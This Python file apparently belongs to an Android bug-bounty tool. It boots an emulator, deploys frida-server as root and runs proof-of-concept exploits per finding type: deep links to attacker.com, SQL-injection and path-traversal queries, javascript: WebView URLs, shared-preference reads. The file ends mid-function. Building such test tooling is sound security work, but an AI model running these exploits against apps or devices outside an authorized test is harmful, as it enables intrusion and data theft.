import os
import sys
import time
import json
import base64
import signal
import shutil
import subprocess
import tempfile
import re
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field
from datetime import datetime, timezone


@dataclass
class EmulatorResult:
    name: str
    success: bool = False
    error: Optional[str] = None
    stdout: str = ""
    stderr: str = ""
    screenshot_before: Optional[str] = None
    screenshot_after: Optional[str] = None
    duration: float = 0.0
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


class EmulatorManager:
    """Simplified emulator manager for bug bounty workflow.
    
    Detects already-running emulators, can start one automatically,
    installs APK + frida-server, captures screenshots, and validates exploits.
    Works with system-installed Android tools (no ANDROID_HOME required).
    """

    def __init__(
        self,
        avd_name: Optional[str] = None,
        device_serial: Optional[str] = None,
        boot_timeout: int = 180,
        emulator_ram: str = "2048",
    ):
        self.avd_name = avd_name
        self.device_serial = device_serial
        self.boot_timeout = boot_timeout
        self.emulator_ram = emulator_ram
        self._emulator_process: Optional[subprocess.Popen] = None
        self._started_by_us = False
        self._adb = self._resolve_adb()
        self._emulator_bin = self._resolve_emulator()

    # ── Tool discovery ──────────────────────────────────────────────

    @staticmethod
    def _resolve_adb() -> str:
        adb = shutil.which("adb")
        if not adb:
            raise RuntimeError("adb not found on PATH. Install platform-tools or add adb to PATH.")
        return adb

    @staticmethod
    def _resolve_emulator() -> Optional[str]:
        return shutil.which("emulator")

    def cmd_prefix(self) -> List[str]:
        if self.device_serial:
            return [self._adb, "-s", self.device_serial]
        return [self._adb]

    @property
    def serial(self) -> str:
        if self.device_serial:
            return self.device_serial
        return "emulator-5554"

    # ── Device detection ────────────────────────────────────────────

    def list_devices(self) -> List[Dict[str, str]]:
        rc, out, _ = self._run([self._adb, "devices"])
        if rc != 0:
            return []
        devices = []
        for line in out.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("List") or stripped.startswith("*"):
                continue
            parts = stripped.split("\t", 1)
            if len(parts) == 2:
                devices.append({"serial": parts[0], "state": parts[1]})
        return devices

    def find_running_emulator(self) -> Optional[str]:
        for d in self.list_devices():
            if d["state"] == "device" and "emulator" in d["serial"]:
                return d["serial"]
        return None

    def is_device_ready(self, serial: Optional[str] = None) -> bool:
        serial = serial or self.device_serial
        if not serial:
            return False
        rc, out, _ = self._run([self._adb, "-s", serial, "shell", "getprop", "sys.boot_completed"])
        return rc == 0 and out.strip() == "1"

    # ── Emulator lifecycle ──────────────────────────────────────────

    def ensure_running(self) -> str:
        existing = self.find_running_emulator()
        if existing:
            print(f"[Emulator] Found running emulator: {existing}")
            self.device_serial = existing
            return existing

        if not self.avd_name:
            avds = self._list_avds()
            if avds:
                self.avd_name = avds[0]
                print(f"[Emulator] No AVD specified, using '{self.avd_name}'")
            else:
                raise RuntimeError("No running emulator found and no AVD available to start.")

        print(f"[Emulator] Starting AVD '{self.avd_name}'...")
        self._start_avd(self.avd_name)
        self._started_by_us = True
        return self.device_serial

    def _list_avds(self) -> List[str]:
        if not self._emulator_bin:
            return []
        rc, out, _ = self._run([self._emulator_bin, "-list-avds"])
        if rc != 0:
            return []
        return [line.strip() for line in out.splitlines() if line.strip()]

    def _start_avd(self, avd_name: str) -> None:
        self._kill_zombie_emulators()

        cmd = [
            self._emulator_bin,
            "-avd", avd_name,
            "-port", "5554",
            "-no-window",
            "-no-audio",
            "-gpu", "swiftshader_indirect",
            "-netdelay", "none",
            "-netspeed", "full",
            "-no-boot-anim",
            "-memory", self.emulator_ram,
        ]

        print(f"[Emulator] Launching: {' '.join(cmd)}")
        self._emulator_process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self.device_serial = "emulator-5554"

        if not self._wait_for_boot():
            raise TimeoutError(
                f"Emulator did not boot within {self.boot_timeout}s. Check AVD state."
            )

        print(f"[Emulator] Boot complete on {self.device_serial}")

    def _wait_for_boot(self) -> bool:
        serial = "emulator-5554"
        deadline = time.time() + self.boot_timeout
        while time.time() < deadline:
            rc, out, _ = self._run(
                [self._adb, "-s", serial, "shell", "getprop", "sys.boot_completed"]
            )
            if rc == 0 and out.strip() == "1":
                # Boot completed — now wait for package manager to be ready
                pm_deadline = time.time() + 30
                while time.time() < pm_deadline:
                    rc2, out2, _ = self._run(
                        [self._adb, "-s", serial, "shell", "pm", "path", "android"],
                        timeout=10,
                    )
                    if rc2 == 0 and "package:" in out2:
                        time.sleep(2)
                        self._dismiss_setup_wizard(serial)
                        time.sleep(1)
                        return True
                    time.sleep(2)
                return True
            time.sleep(2)
        return False

    def _dismiss_setup_wizard(self, serial: str) -> None:
        """Bypass Android Setup wizard that blocks interaction on fresh boot."""
        # Mark setup as complete via settings
        for args in [
            ["settings", "put", "global", "device_provisioned", "1"],
            ["settings", "put", "secure", "user_setup_complete", "1"],
        ]:
            try:
                self._run([self._adb, "-s", serial, "shell"] + args, timeout=5)
            except Exception:
                pass

        # Disable & clear setup wizard packages
        for pkg in [
            "com.google.android.setupwizard",
            "com.android.setupwizard",
            "com.google.android.pixel.setupwizard",
            "com.google.android.setupwizard.customization",
        ]:
            for action in [
                ["pm", "disable-user", "--user", "0", pkg],
                ["pm", "clear", pkg],
                ["am", "force-stop", pkg],
            ]:
                try:
                    self._run([self._adb, "-s", serial, "shell"] + action, timeout=5)
                except Exception:
                    pass

        # Send KEYCODE_HOME to return to launcher
        try:
            self._run(
                [self._adb, "-s", serial, "shell", "input", "keyevent", "KEYCODE_HOME"],
                timeout=3,
            )
        except Exception:
            pass

    def stop(self) -> None:
        if self._started_by_us:
            print("[Emulator] Shutting down...")
            if self._emulator_process and self._emulator_process.poll() is None:
                try:
                    self._run_cmd(self.cmd_prefix() + ["emu", "kill"])
                    time.sleep(2)
                except Exception:
                    pass
                try:
                    self._emulator_process.kill()
                    self._emulator_process.wait(timeout=10)
                except Exception:
                    pass
        self._kill_zombie_emulators()

    def _kill_zombie_emulators(self) -> None:
        try:
            for pattern in ["qemu.*-avd", "qemu-system", "emulator.*-avd"]:
                r = subprocess.run(
                    ["pgrep", "-f", pattern], capture_output=True, text=True, timeout=5
                )
                for pid in r.stdout.strip().splitlines():
                    if not pid:
                        continue
                    try:
                        os.kill(int(pid), signal.SIGKILL)
                    except (ProcessLookupError, PermissionError):
                        pass
            time.sleep(2)
        except Exception:
            pass

    # ── APK operations ──────────────────────────────────────────────

    def install_apk(self, apk_path: str) -> str:
        apk_path = os.path.abspath(apk_path)
        if not os.path.isfile(apk_path):
            raise FileNotFoundError(f"APK not found: {apk_path}")

        pkg = self._get_package_name(apk_path)

        self._run_cmd(self.cmd_prefix() + ["uninstall", pkg], timeout=10)
        print(f"[Emulator] Installing {apk_path}...")
        rc, out, err = self._run_cmd(
            self.cmd_prefix() + ["install", "-r", apk_path], timeout=120
        )
        if rc != 0 or "Success" not in (out + err):
            raise RuntimeError(f"APK install failed: {err[:500]}")
        print(f"[Emulator] Installed package: {pkg}")
        return pkg

    @staticmethod
    def _get_package_name(apk_path: str) -> str:
        try:
            r = subprocess.run(
                ["aapt2", "dump", "badging", apk_path],
                capture_output=True, text=True, timeout=30,
            )
            m = re.search(r"package: name='([^']+)'", r.stdout)
            if m:
                return m.group(1)
        except FileNotFoundError:
            pass
        try:
            r = subprocess.run(
                ["aapt", "dump", "badging", apk_path],
                capture_output=True, text=True, timeout=30,
            )
            m = re.search(r"package: name='([^']+)'", r.stdout)
            if m:
                return m.group(1)
        except FileNotFoundError:
            pass
        try:
            from androguard.core.bytecodes.apk import APK
            apk = APK(apk_path)
            return apk.get_package()
        except Exception:
            pass
        base = os.path.basename(apk_path)
        name = os.path.splitext(base)[0]
        print(f"[Emulator] Could not determine package name, using filename: {name}")
        return name

    def ensure_frida(self, frida_binary: Optional[str] = None, as_root: bool = True) -> bool:
        """Deploy + start frida-server. If *as_root* (default), kills any
        existing shell-owned instance and restarts as root via `su root`."""
        ps_cmd = self.cmd_prefix() + ["shell", "ps", "-A", "|", "grep", "frida-server"]
        rc, out, _ = self._run_cmd(ps_cmd)

        current_user = ""
        for line in out.splitlines():
            if "frida-server" in line:
                current_user = line.split()[0] if line.split() else ""

        if current_user == "root" and rc == 0 and "frida-server" in out:
            print("[Emulator] frida-server already running (root)")
            return True

        if rc == 0 and "frida-server" in out:
            print("[Emulator] frida-server running as shell, restarting as root...")
            self._run_cmd(self.cmd_prefix() + ["shell", "su", "root", "killall", "frida-server"], timeout=5)
            time.sleep(1)

        binary = frida_binary
        if not binary or not os.path.exists(binary):
            candidates = [
                "/tmp/frida-server",
                "/data/local/tmp/frida-server",
                shutil.which("frida-server") or "",
            ]
            for c in candidates:
                if c and os.path.exists(c):
                    binary = c
                    break
        if not binary or not os.path.exists(binary):
            print("[Emulator] frida-server binary not found, skipping deploy")
            return False

        print(f"[Emulator] Deploying frida-server from {binary}...")
        self._run_cmd(self.cmd_prefix() + ["push", binary, "/data/local/tmp/frida-server"], timeout=30)
        self._run_cmd(self.cmd_prefix() + ["shell", "chmod", "755", "/data/local/tmp/frida-server"], timeout=10)

        if as_root:
            # Toybox-style su: "su root COMMAND" not "su -c COMMAND"
            self._run_cmd(
                self.cmd_prefix() + ["shell", "su", "root", "nohup",
                                     "/data/local/tmp/frida-server", ">", "/dev/null", "2>&1", "&"],
                timeout=5,
            )
        else:
            self._run_cmd(
                self.cmd_prefix() + ["shell", "nohup", "/data/local/tmp/frida-server",
                                     ">", "/dev/null", "2>&1", "&"],
                timeout=5,
            )
        time.sleep(3)

        rc, out, _ = self._run_cmd(ps_cmd)
        ok = rc == 0 and "frida-server" in out
        if ok:
            for line in out.splitlines():
                if "frida-server" in line:
                    user = line.split()[0] if line.split() else "?"
                    print(f"[Emulator] frida-server running (user={user})")
                    break
        else:
            print("[Emulator] frida-server NOT running")
        return ok

    def grant_permissions(self, pkg: str) -> None:
        perms = [
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
        ]
        for perm in perms:
            self._run(self.cmd_prefix() + ["shell", "pm", "grant", pkg, perm], timeout=5)

    def get_main_activity(self, pkg: str) -> str:
        rc, out, _ = self._run_cmd(
            self.cmd_prefix() + ["shell", "cmd", "package", "resolve-activity",
                                 "-c", "android.intent.category.LAUNCHER", pkg],
            timeout=10,
        )
        for line in out.splitlines():
            if "name=" in line:
                m = re.search(r"name=([^\s/]+)", line)
                if m:
                    return f"{pkg}/{m.group(1)}"
        return pkg

    def launch_app(self, pkg: str) -> None:
        activity = self.get_main_activity(pkg)
        self._run_cmd(
            self.cmd_prefix() + ["shell", "am", "start", "-n", activity,
                                 "-a", "android.intent.action.MAIN",
                                 "-c", "android.intent.category.LAUNCHER"],
            timeout=10,
        )
        time.sleep(2)

    # ── Screenshots ─────────────────────────────────────────────────

    def capture_screenshot(self, name: str = "screenshot") -> Optional[str]:
        """Capture screenshot using adb exec-out (streams PNG directly, no sdcard needed)."""
        try:
            r = subprocess.run(
                self.cmd_prefix() + ["exec-out", "screencap", "-p"],
                capture_output=True, timeout=10,
            )
            if r.returncode != 0 or len(r.stdout) < 500:
                return None
            if r.stdout[:4] != b'\x89PNG':
                return None
            return base64.b64encode(r.stdout).decode("utf-8")
        except subprocess.TimeoutExpired:
            print(f"[Emulator] Screenshot timeout for '{name}'")
            return None
        except Exception as e:
            print(f"[Emulator] Screenshot error for '{name}': {e}")
            return None

    # ── Screen Recording ────────────────────────────────────────────

    def capture_video(self, name: str = "recording", duration: int = 10,
                      bit_rate: int = 2000000,
                      cmd_text: Optional[str] = None,
                      run_cmd: Optional[List[str]] = None) -> Optional[str]:
        """Record screen + optionally run a command mid-recording + overlay cmd_text.

        If *run_cmd* is given, it is executed *while* the screen is being recorded
        so the video captures the screen change caused by the command.
        *cmd_text* is burned into the top-left corner of the final video.
        """
        device_path = f"/sdcard/{name}.mp4"
        local_path = None
        overlaid_path = None
        rec_proc = None
        try:
            # 1. Start screenrecord in background
            rec_proc = subprocess.Popen(
                self.cmd_prefix() + ["shell", "screenrecord",
                                      f"--time-limit={duration}",
                                      f"--bit-rate={bit_rate}",
                                      device_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(1.5)  # let recording settle

            # 2. Run the exploit command DURING the recording
            if run_cmd:
                self._run_cmd(run_cmd, timeout=duration + 10)

            # 3. Wait for recording to finish
            start = time.time()
            while time.time() - start < duration + 5:
                ret = rec_proc.poll()
                if ret is not None:
                    break
                time.sleep(0.5)
            if rec_proc.poll() is None:
                rec_proc.kill()
                rec_proc.wait(timeout=5)

            # 4. Pull video
            with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmp:
                local_path = tmp.name

            rc, _, _ = self._run_cmd(
                self.cmd_prefix() + ["pull", device_path, local_path], timeout=15
            )
            if rc != 0 or not os.path.exists(local_path) or os.path.getsize(local_path) < 100:
                return None

            # 5. Overlay command text using FFmpeg drawtext
            if cmd_text and os.path.getsize(local_path) > 0:
                ffmpeg = shutil.which("ffmpeg")
                if ffmpeg:
                    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt",
                                                     delete=False) as cmd_fh:
                        cmd_fh.write(cmd_text)
                        cmd_file_path = cmd_fh.name

                    with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmp:
                        overlaid_path = tmp.name

                    try:
                        r = subprocess.run([
                            ffmpeg, "-i", local_path,
                            "-vf",
                            f"drawtext=textfile={cmd_file_path}"
                            f":fontsize=20:fontcolor=white"
                            f":x=12:y=12:box=1:boxcolor=black@0.65:boxborderw=8"
                            f":fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
                            "-y", overlaid_path,
                        ], capture_output=True, text=True, timeout=30)
                        if r.returncode == 0 and os.path.getsize(overlaid_path) > 100:
                            local_path = overlaid_path
                    except Exception:
                        pass
                    finally:
                        try:
                            os.unlink(cmd_file_path)
                        except OSError:
                            pass

            with open(local_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode("utf-8")
            return b64
        except Exception:
            return None
        finally:
            if rec_proc and rec_proc.poll() is None:
                try:
                    rec_proc.kill()
                except Exception:
                    pass
            try:
                self._run_cmd(self.cmd_prefix() + ["shell", "rm", "-f", device_path], timeout=5)
            except Exception:
                pass
            if local_path and local_path != overlaid_path:
                try:
                    os.unlink(local_path)
                except OSError:
                    pass
            if overlaid_path:
                try:
                    os.unlink(overlaid_path)
                except OSError:
                    pass

    # ── Exploit validation ──────────────────────────────────────────

    def _get_foreground_package(self) -> str:
        """Return the package name of the currently focused app, or ''.
        
        Tries multiple methods for API 30+ compatibility.
        """
        # Method 1: dumpsys window windows (API 29+)
        for cmd in [
            ["shell", "dumpsys", "window", "windows"],
            ["shell", "dumpsys", "window"],
        ]:
            try:
                rc, out, _ = self._run_cmd(self.cmd_prefix() + cmd, timeout=5)
                for line in out.splitlines():
                    if "mCurrentFocus" in line:
                        m = re.search(r"([a-zA-Z0-9_.]+)/", line)
                        if m:
                            return m.group(1)
            except Exception:
                continue

        # Method 2: dumpsys activity activities | grep mResumedActivity
        try:
            rc, out, _ = self._run_cmd(
                self.cmd_prefix() + ["shell", "dumpsys", "activity", "activities"],
                timeout=5,
            )
            for line in out.splitlines():
                if "mResumedActivity" in line:
                    m = re.search(r"([a-zA-Z0-9_.]+)/", line)
                    if m:
                        return m.group(1)
        except Exception:
            pass

        # Method 3: dumpsys activity top
        try:
            rc, out, _ = self._run_cmd(
                self.cmd_prefix() + ["shell", "dumpsys", "activity", "top"],
                timeout=5,
            )
            for line in out.splitlines():
                if "ACTIVITY" in line:
                    m = re.search(r"([a-zA-Z0-9_.]+)/", line)
                    if m:
                        return m.group(1)
        except Exception:
            pass
        return ""

    def validate_exploit(self, finding: Dict[str, Any], pkg: str,
                         main_activity: str) -> EmulatorResult:
        fid = finding.get("id", "UNKNOWN")
        ftype = finding.get("type", "generic")
        result = EmulatorResult(name=fid)

        before = self.capture_screenshot(f"exploit_{fid}_before")
        result.screenshot_before = before

        start = time.time()
        try:
            commands = self._execute_exploit(fid, ftype, finding, pkg, main_activity)
            result.success = True
            result.stdout = commands
            # Verify exploit opened in TARGET app, not generic browser
            time.sleep(1.5)
            fg_pkg = self._get_foreground_package()
            if fg_pkg and fg_pkg != pkg and ("com.android.chrome" in fg_pkg or "browser" in fg_pkg):
                result.success = False
                result.error = f"Exploit opened in {fg_pkg} (generic handler), not target {pkg}"
        except Exception as e:
            result.success = False
            result.error = str(e)

        after = self.capture_screenshot(f"exploit_{fid}_after")
        result.screenshot_after = after
        result.duration = round(time.time() - start, 3)
        return result

    def _execute_exploit(self, fid: str, ftype: str, finding: Dict[str, Any],
                         pkg: str, main_activity: str) -> str:
        component = finding.get("component") or main_activity
        output_lines = []

        if ftype in ("exported_activity", "exported_service",
                      "task_affinity", "task_hijacking"):
            intent_flags = ""
            if ftype in ("task_affinity", "task_hijacking"):
                intent_flags = "-f 0x10000000"
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "start", "-n", component, intent_flags],
                timeout=15,
            )
            output_lines.append(f"$ am start -n {component} {intent_flags}".strip())
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "exported_receiver":
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "broadcast", "-n", component],
                timeout=15,
            )
            output_lines.append(f"$ am broadcast -n {component}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "boot_receiver":
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "broadcast",
                                      "-a", "android.intent.action.BOOT_COMPLETED",
                                      "-n", component],
                timeout=15,
            )
            output_lines.append(f"$ am broadcast -a BOOT_COMPLETED -n {component}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype in ("exported_provider", "provider_uri_permissions"):
            uri = finding.get("uri", "content://")
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "content", "query", "--uri", uri],
                timeout=15,
            )
            output_lines.append(f"$ content query --uri {uri}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "implicit_activity":
            action = finding.get("action", "android.intent.action.VIEW")
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "start",
                                      "-a", action],
                timeout=15,
            )
            output_lines.append(f"$ am start -a {action}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "implicit_broadcast":
            action = finding.get("action", "android.intent.action.VIEW")
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "broadcast",
                                      "-a", action],
                timeout=15,
            )
            output_lines.append(f"$ am broadcast -a {action}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "foreground_service":
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "startservice",
                                      "-n", component],
                timeout=15,
            )
            output_lines.append(f"$ am startservice -n {component}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype in ("deep_link", "custom_scheme"):
            scheme = finding.get("scheme", "")
            host = finding.get("host", "open")
            deep_link_path = finding.get("deep_link_path", "")
            matches = finding.get("matches", [])

            # Extract component name from matches
            comp = ""
            for m in matches if isinstance(matches, list) else []:
                if not isinstance(m, str):
                    continue
                for a in re.findall(r"parent='([^']*)'", m):
                    if a and not comp:
                        comp = a
                        break

            if comp:
                if comp.startswith("."):
                    comp = f"{pkg}{comp}"
                elif not comp.startswith(pkg):
                    comp = f"{pkg}/.{comp}"
                if scheme and scheme not in ("http", "https"):
                    target_uri = f"{scheme}://{host}{deep_link_path}/{pkg}/?url=https://attacker.com/poc"
                    rc, out, err = self._run_cmd(
                        self.cmd_prefix() + ["shell", "am", "start",
                                              "-n", comp, "-d", target_uri],
                        timeout=15,
                    )
                    output_lines.append(f"$ am start -n {comp} -d {target_uri}")
                else:
                    rc, out, err = self._run_cmd(
                        self.cmd_prefix() + ["shell", "am", "start",
                                              "-n", comp,
                                              "--es", "url", "https://attacker.com/poc"],
                        timeout=15,
                    )
                    output_lines.append(f"$ am start -n {comp} --es url 'https://attacker.com/poc'")
                output_lines.append(out[:500] if out else err[:500])
            elif scheme and scheme not in ("http", "https"):
                target_uri = f"{scheme}://{host}{deep_link_path}/{pkg}/?url=https://attacker.com/poc"
                rc, out, err = self._run_cmd(
                    self.cmd_prefix() + ["shell", "am", "start",
                                          "-a", "android.intent.action.VIEW",
                                          "-d", target_uri],
                    timeout=15,
                )
                output_lines.append(f"$ am start -a VIEW -d {target_uri}")
                output_lines.append(out[:500] if out else err[:500])
            else:
                target_uri = f"https://{host or pkg}.com/poc"
                rc, out, err = self._run_cmd(
                    self.cmd_prefix() + ["shell", "am", "start",
                                          "-a", "android.intent.action.VIEW",
                                          "-d", target_uri],
                    timeout=15,
                )
                output_lines.append(f"$ am start -a VIEW -d {target_uri}")
                output_lines.append(out[:500] if out else err[:500])

        elif ftype == "backup_enabled":
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["backup", "-f", f"/sdcard/{pkg}.ab", pkg],
                timeout=15,
            )
            output_lines.append(f"$ adb backup -f {pkg}.ab {pkg}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "pull_shared_prefs":
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "cat",
                                      f"/data/data/{pkg}/shared_prefs/*.xml"],
                timeout=10,
            )
            output_lines.append(f"$ cat /data/data/{pkg}/shared_prefs/*.xml")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "sql_injection":
            uri = finding.get("uri", "content://")
            payload = finding.get("payload", "' OR 1=1 --")
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "content", "query", f"{uri}?input={payload}"],
                timeout=15,
            )
            output_lines.append(f"$ content query {uri}?input={payload}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "path_traversal":
            path = finding.get("path", "/data/data/")
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "run-as", pkg, "cat", f"../../{path}"],
                timeout=15,
            )
            output_lines.append(f"$ run-as {pkg} cat ../../{path}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "intent_redirection":
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "start",
                                      "-n", component,
                                      "--es", "redirect", "intent://test"],
                timeout=15,
            )
            output_lines.append(f"$ am start -n {component} --es redirect intent://test")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "webview_rce":
            js_url = f"javascript:alert('POC_JS_EXECUTION_{fid}')"
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "am", "start",
                                      "-a", "android.intent.action.VIEW",
                                      "-d", js_url],
                timeout=15,
            )
            output_lines.append(f"$ am start -a VIEW -d '{js_url}'")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "log_exposure":
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["logcat", "-d", "-s", pkg.replace(".", ":")],
                timeout=10,
            )
            output_lines.append(f"$ logcat -d -s {pkg.replace('.', ':')}")
            output_lines.append(out[:500] if out else err[:500])

        elif ftype == "frida_poc":
            script = finding.get("frida_script", "")
            if script:
                tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False)
                tmp.write(script)
                tmp.close()
                try:
                    rc, out, err = self._run_cmd(
                        self.cmd_prefix() + ["shell", "cat", f"/data/local/tmp/{fid}.js"],
                        timeout=5,
                    )
                    if rc != 0:
                        self._run_cmd(
                            self.cmd_prefix() + ["push", tmp.name, f"/data/local/tmp/{fid}.js"],
                            timeout=10,
                        )
                    output_lines.append(f"$ frida -U -n {pkg} -l /data/local/tmp/{fid}.js")
                    output_lines.append(f"# Script deployed: {fid}.js")
                finally:
                    try:
                        os.unlink(tmp.name)
                    except OSError:
                        pass
            else:
                output_lines.append(f"# No frida script for {fid}")

        else:
            rc, out, err = self._run_cmd(
                self.cmd_prefix() + ["shell", "monkey", "-p", pkg,
                                      "-c", "android.intent.category.LAUNCHER", "1"],
                timeout=15,
            )
            output_lines.append(f"$ monkey -p {pkg} 1")
            output_lines.append(out[:500] if out else err[:500])

        time.sleep(1)
        rc, out, _ = self._run_cmd(
            self.cmd_prefix() + ["logcat", "-d", "-t", "10"], timeout=5
        )
        if out:
            output_lines.append("--- logcat tail ---")
            output_lines.append(out[:500])

        return "\n".join(output_lines)

    def validate_findings(self, findings: List[Dict[str, Any]],
                          apk_path: str) -> List[EmulatorResult]:
        pkg = self.install_apk(apk_path)
        self.grant_permissions(pkg)
        self.launch_app(pkg)
        self.ensure_frida()
        time.sleep(2)

        main_activity = self.get_main_activity(pkg)
        results = []
        total = len(findings)
        for i, finding in enumerate(findings):
            print(f"[Emulator] Validating {i+1}/{total}: {finding.get('id', '?')} "
                  f"({finding.get('type', '?')})")
            result = self.validate_exploit(finding, pkg, main_activity)
            status = "PASS" if result.success else "FAIL"
            print(f"  [{status}] {result.name} in {result.duration:.1f}s")
            results.append(result)
        return results

    # ── Logcat ──────────────────────────────────────────────────────

    def get_logcat(self, pkg: str, lines: int = 50) -> str:
        rc, out, _ = self._run_cmd(
            self.cmd_prefix() + ["logcat", "-d", "-t", str(lines)], timeout=10
        )
        return out

    # ── Run helper ──────────────────────────────────────────────────

    def _run_cmd(self, cmd: List[str], timeout: int = 30) -> tuple:
        return self._run(cmd, timeout)

    @staticmethod
    def _run(cmd: List[str], timeout: int = 30) -> tuple:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return r.returncode, r.stdout, r.stderr
        except FileNotFoundError:
            return -1, "", f"command not found: {cmd[0]}"
        except subprocess.TimeoutExpired:
            return -1, "", "timeout"
        except Exception as e:
            return -1, "", str(e)

    # ── Device info for report ──────────────────────────────────────

    def get_device_info(self) -> Dict[str, Any]:
        info = {"serial": self.serial}
        props = [
            ("model", "ro.product.model"),
            ("build", "ro.build.display.id"),
            ("sdk", "ro.build.version.sdk"),
            ("release", "ro.build.version.release"),
            ("manufacturer", "ro.product.manufacturer"),
            ("device", "ro.product.device"),
        ]
        for key, prop in props:
            rc, out, _ = self._run(self.cmd_prefix() + ["shell", "getprop", prop], timeout=5)
            info[key] = out.strip() if rc == 0 else "?"
        info["frida_running"] = self._check_frida_running()
        info["rooted"] = self._check_root()
        return info

    def _check_frida_running(self) -> bool:
        rc, out, _ = self._run_cmd(
            self.cmd_prefix() + ["shell", "ps", "|", "grep", "frida-server"]
        )
        return rc == 0 and "frida-server" in out

    def _check_root(self) -> bool:
        rc, out, _ = self._run_cmd(
            self.cmd_prefix() + ["shell", "su", "root", "id"], timeout=5
        )
        return rc == 0 and "uid=0(root)" in out

    # ── Frida Runtime Hooks ──────────────────────────────────────────

    def run_frida_hooks(self, pkg: str, hook_script: str = "",
                        timeout: int = 20) -> List[Dict[str, Any]]:
        """Spawn *pkg* with Frida, inject master_hook.js, collect findings."""
        script_path = hook_script or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
            "frida_scripts", "master_hook.js"
        )
        if not os.path.exists(script_path):
            print(f"[Frida] Hook script not found: {script_path}")
            return []

        if not self.ensure_frida(as_root=True):
            print("[Frida] frida-server not running, skipping hooks")
            return []

        try:
            import frida
        except ImportError:
            print("[Frida] frida Python package not installed")
            return []

        try:
            dev = frida.get_device(self.device_serial or "emulator-5554", timeout=10)
        except Exception as e:
            print(f"[Frida] Device connect failed: {e}")
            return []

        findings = []
        session = None
        try:
            pid = dev.spawn([pkg])
            session = dev.attach(pid)

            with open(script_path) as f:
                code = f.read()

            script = session.create_script(code)

            def on_message(msg, data):
                if msg.get("type") == "send":
                    findings.append(msg["payload"])

            script.on("message", on_message)
            script.load()
            dev.resume(pid)

            # Poll for findings during the timeout period
            deadline = time.time() + timeout
            poll_interval = 0.5
            while time.time() < deadline:
                time.sleep(poll_interval)
                try:
                    # Check if process still alive — lightweight
                    _ = dev.get_process(pkg)
                except Exception:
                    break  # process exited, collect what we have

        except Exception as e:
            print(f"[Frida] Hook injection failed: {e}")
        finally:
            if session:
                try:
                    session.detach()
                except Exception:
                    pass
            try:
                dev.kill(pkg)
            except Exception:
                pass

        ssl_count = sum(1 for f in findings if f.get("type") == "ssl")
        crypto_count = sum(1 for f in findings if f.get("type") == "crypto")
        exec_count = sum(1 for f in findings if f.get("type") == "exec")
        webview_count = sum(1 for f in findings if f.get("type") == "webview")
        prefs_count = sum(1 for f in findings if f.get("type") == "prefs")
        file_count = sum(1 for f in findings if f.get("type") == "file")
        sqlite_count = sum(1 for f in findings if f.get("type") == "sqlite")
        toast_count = sum(1 for f in findings if f.get("type") == "toast")
        clipboard_count = sum(1 for f in findings if f.get("type") == "clipboard")
        intent_count = sum(1 for f in findings if f.get("type") == "intent")
        bypass_count = sum(1 for f in findings if f.get("type") == "root_bypass")

        print(f"[Frida] Hooks done: SSL={ssl_count} Crypto={crypto_count} "
              f"Exec={exec_count} WebView={webview_count} "
              f"Prefs={prefs_count} File={file_count} "
              f"SQLite={sqlite_count} Toast={toast_count} "
              f"Clipboard={clipboard_count} Intent={intent_count} "
              f"RootBypass={bypass_count}")

        return findings

    # ── Screenshot Diffing ───────────────────────────────────────────

    @staticmethod
    def diff_screenshots(b64_before: Optional[str],
                         b64_after: Optional[str]) -> Dict[str, Any]:
        """Compare two base64-encoded PNG screenshots.

        Returns dict with:
          - diff_score: 0.0 (identical) to 1.0 (completely different)
          - diff_bytes: size in bytes of the pixel-difference PNG, or 0
          - diff_b64: base64-encoded diff image (pixels that changed in red)
        """
        if not b64_before or not b64_after:
            return {"diff_score": 0.0, "diff_bytes": 0, "diff_b64": ""}

        try:
            from PIL import Image
            import io
            import base64

